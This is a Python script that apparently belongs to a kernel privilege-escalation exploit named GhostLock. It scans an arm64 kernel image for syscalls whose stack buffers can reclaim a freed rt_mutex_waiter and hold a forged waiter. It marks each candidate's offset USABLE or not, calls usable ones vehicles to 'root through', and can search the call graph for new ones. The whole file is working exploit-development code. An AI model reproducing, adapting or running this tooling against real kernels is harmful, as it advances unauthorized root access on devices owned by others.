#!/usr/bin/env python3
"""vehicle-scan -- sweep a kernel build for a usable byte-copy reclaim vehicle.

GhostLock's reclaim step needs some syscall whose own on-stack buffer overlaps
the freed rt_mutex_waiter with the whole forged waiter inside it. Which syscall
(if any) works is a per-build fact of two functions' frame sizes; this runs
offset_rules.scan_reclaim_vehicles() over every derivable candidate and prints
each one's WAITER_OFF and whether it lands in its own usable window.

  vehicle-scan.py --image data/live/<t>/Image                 # recover kallsyms
  vehicle-scan.py --image <Image> --kallsyms <kallsyms.txt>    # supply one

The window is [low, buffer-0x40]: low is -8 for a narrow vehicle (task+lock
only) or 0 for a full one (also tree_parent), and buffer-0x40 keeps lock
(waiter+0x38) inside the copy. A row marked USABLE is a vehicle this build can
root through; see offset_rules.scan_reclaim_vehicles() and common.h's geometry
comment for the derivation.
"""
import argparse
import os
import subprocess
import sys

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                "..", "..", "runner", "scripts", "lib"))
import offset_rules  # noqa: E402


def kallsyms_from_image(path):
    if not __import__("shutil").which("kallsyms-finder"):
        sys.exit("[!] kallsyms-finder not on PATH (pip install vmlinux-to-elf) "
                 "or pass --kallsyms")
    r = subprocess.run(["kallsyms-finder", path], capture_output=True,
                       text=True)
    if r.returncode != 0:
        sys.exit("[!] kallsyms-finder failed:\n" + (r.stderr or "").strip())
    return r.stdout


def load_syms(text):
    syms = {}
    for line in text.splitlines():
        f = line.split(maxsplit=2)
        if len(f) >= 3:
            syms.setdefault(f[2].strip(), int(f[0], 16))
    return syms


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--image", required=True, help="raw arm64 kernel Image")
    ap.add_argument("--kallsyms", help="kallsyms file; recovered from the "
                                       "Image when omitted")
    ap.add_argument("--discover", action="store_true",
                    help="also sweep the call graph for NEW stack-copy "
                         "vehicles, not just the known ones")
    ap.add_argument("--all-syscalls", action="store_true",
                    help="with --discover, walk from every __arm64_sys_* "
                         "entry (slow), not the curated family set")
    ap.add_argument("--near", type=int, default=16,
                    help="with --discover, also show copies within N bytes of "
                         "a window (default 16)")
    args = ap.parse_args()

    ks_text = (open(args.kallsyms, errors="replace").read()
               if args.kallsyms else kallsyms_from_image(args.image))
    syms = load_syms(ks_text)
    if "_text" not in syms:
        sys.exit("[!] no _text in the symbol table")
    img = open(args.image, "rb").read()
    offset_rules.load_duplicate_addrs_from_text(ks_text)

    rows = offset_rules.scan_reclaim_vehicles(img, syms, syms["_text"])
    print(f"_text = {syms['_text']:#018x}   ({len(syms)} symbols)\n")
    print(f"{'vehicle':<11} {'geom':<7} {'buf':>4} {'WAITER_OFF':>11} "
          f"{'window':>14}  verdict")
    print("-" * 62)
    usable = 0
    for r in rows:
        off = "UNRESOLVED" if r["off"] is None else f"{r['off']:+d}"
        win = f"[{r['low']}, {r['high']}]"
        if r["off"] is None:
            verdict = "unresolved"
        elif r["in_window"]:
            verdict = "USABLE"
            usable += 1
        else:
            where = "too positive" if r["off"] > r["high"] else "too negative"
            verdict = f"out ({where})"
        print(f"{r['name']:<11} {r['geometry']:<7} {r['buffer']:>4} "
              f"{off:>11} {win:>14}  {verdict}")
    print()
    print(f"{usable} usable vehicle(s) on this build."
          if usable else "No derivable vehicle lands in window on this build.")

    if args.discover:
        roots = "all" if args.all_syscalls else None
        print("\n== discovery: stack-copy candidates from the call graph ==")
        cand = offset_rules.discover_vehicles(img, syms, syms["_text"],
                                              roots=roots, near=args.near)
        if not cand:
            print("(none within the window margin)")
            return 0
        print(f"{'copy site':<24} {'size':>4} {'WAITER_OFF':>11} "
              f"{'window':>12}  verdict   flags        via")
        print("-" * 88)
        for c in cand:
            off = f"{c['off']:+d}"
            win = f"[{c['low']}, {c['high']}]"
            if c["in_window"]:
                verdict = "USABLE"
            elif c["sp_uncertain"]:
                verdict = "sp?"
            else:
                verdict = "near"
            flags = ",".join(f for f, on in (
                ("fail-clean", c["fails_clean"]), ("compat", c["compat_only"]),
                ("sp?", c["sp_uncertain"]), ("ambig", c["ambiguous"])) if on)
            print(f"{c['copy_fn']:<24} {c['size']:>4} {off:>11} {win:>12}  "
                  f"{verdict:<8}  {flags:<12} {c['root']}")
        print("\nCandidates, not proven vehicles. flags: compat = reached only "
              "from a 32-bit caller; sp? = a stack giveback leaves the slot "
              "static-unconfirmable (verify by hand); ambig = the offset is "
              "path-dependent; fail-clean = the copy's syscall looks like it "
              "errors out with no side effect (a hint). An in-window copy still "
              "has to survive the rest of the pi-chain walk; confirm a promising "
              "one with an offset_rules chain rule.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
